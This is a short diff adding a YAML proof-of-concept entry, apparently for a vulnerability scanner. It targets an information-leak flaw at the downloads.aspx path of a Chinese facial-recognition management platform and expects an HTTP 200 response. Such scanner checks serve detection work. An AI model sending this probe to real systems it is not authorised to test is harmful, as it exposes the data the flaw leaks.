@@ -1,0 +1,3 @@
+name: "脸爱云一脸通智慧管理平台存在downloads.aspx信息泄露漏洞"
+poc: "/downloads.aspx"
+status_code: 200
